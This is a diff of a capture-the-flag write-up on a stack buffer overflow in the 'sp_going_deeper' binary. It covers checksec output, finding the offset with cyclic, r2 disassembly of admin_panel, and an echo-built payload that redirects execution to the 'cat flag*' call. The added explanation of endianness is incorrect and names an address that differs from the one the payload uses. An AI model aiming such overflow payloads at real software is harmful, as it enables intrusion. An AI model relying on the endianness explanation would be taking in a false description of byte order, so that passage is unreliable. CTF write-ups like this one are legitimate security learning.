@@ -13,7 +13,7 @@ cat flag*
 ;*3$"
  ```
 
-checksec tells us a lot about the binary, especially security settings.
+checksec tells us a lot about the binary, especially security settings. No canary means buffer overflow likely possible and no PIE hints at a vulnerable binary.  PIE binarys (Position Independent Executable) are loaded into random locations within virtual memory each time the application is executed. This makes Return Oriented Programming (ROP) attacks much more difficult to execute reliably. 
 
 ` checksec --file=sp_going_deeper `
 ```                                                                                                                        
@@ -25,7 +25,8 @@ Full RELRO      No canary found   NX enabled    No PIE          No RPATH   RW-RU
 ```
 
 
-Let's run the program.  Inputing a string of A's reveals it is vuln to a buffer overflow:
+Let's run the program.  Inputing a string of A's reveals it is vuln to a buffer overflow. Note the segmentation fault at the end:
+
 ` ./sp_going_deeper`
 
 ``` [*] Safety mechanisms are enabled!
@@ -48,7 +49,7 @@ zsh: segmentation fault  ./sp_going_deeper
  ```
 
 
-Let's use `cyclic` from pwntools to generate a pattern for our BO payload: The ` 1\n ` will select option 1 of the menu with a return key when we run the program:
+Let's use `cyclic` from pwntools to generate a pattern for our BO payload: The ` 1\n ` will select option 1 of the menu and hit enter for us when we run the program:
 
 ` echo -en "1\n$(cyclic 1024)" > payload `
 
@@ -180,12 +181,14 @@ Let's use `r2` to get the address we need to point our payload to:
 0x00400ba0    4 101          sym.__libc_csu_init
 0x004007d0    1 2            sym._dl_relocate_static_pie
 0x00400b47    1 84           main
+--------------snip-------------------
  ```
 The `aaaa` command does a full analysis and the `afl` lists all functions. Let's look deeper at `main`
 
+
+[0x004007a0]> `pdf@main`
 ```
-[0x004007a0]> pdf@main
-            ; DATA XREF from entry0 @ 0x4007bd
+; DATA XREF from entry0 @ 0x4007bd
 ┌ 84: int main (int argc, char **argv, char **envp);
 │           ; var int64_t var_18h @ rbp-0x18
 │           ; var int64_t var_10h @ rbp-0x10
@@ -209,7 +212,8 @@ The `aaaa` command does a full analysis and the `afl` lists all functions. Let's
 ```
 The sym.admin_panel looks interesting- let's go deeper:
 
-``` [0x004007a0]> pdf@sym.admin_panel
+ [0x004007a0]> `pdf@sym.admin_panel`
+ ```
             ; CALL XREF from main @ 0x400b8f
 ┌ 350: sym.admin_panel (uint32_t arg1, uint32_t arg2, uint32_t arg3);
 │           ; var uint32_t var_48h @ rbp-0x48
@@ -228,18 +232,19 @@ The sym.admin_panel looks interesting- let's go deeper:
 │       │   0x00400b0d      e8fefbffff     call sym.imp.printf         ; int printf(const char *format)
 │       │   0x00400b12      488d3da50a00.  lea rdi, str.cat_flag       ; 0x4015be ; "cat flag*" ; const char *string
  ```
-This section is the the juicy part.  It tells us the exact location address `0x00400b12' to point our payload.  If we can get the program to crash right here, it should execute the `cat flag*` command and output the flag file.
+This section is the the juicy part.  It tells us the exact location address `0x00400b12` to point our payload.  If we can get the program to crash right here, it should execute the `cat flag*` command and output the flag file.
 
 
 
-Using our BO offset of 85 bytes and the address of our cat function, putting it in Endian format, we construct the following payload2:
+Using our BO offset of 85 bytes and the address of our cat function, putting it in Endian format, we construct the following payload2.
+a quick note on Endian format. Take the address `0x00400b0d` strip the last 3 hex numbers from it then place them in reverse order, inserting '\x' before each one:
 
 `echo -en "1\n$(cyclic 85)\x12\x0B\x40" > payload2 `
 
-```
-(gdb) r < payload2 
+
+(gdb) `r < payload2`
+
 Starting program: /root/Downloads/CTF/challenge/sp_going_deeper < payload2 
-```
 
 ```
 1. Disable mechanisms ⚙️
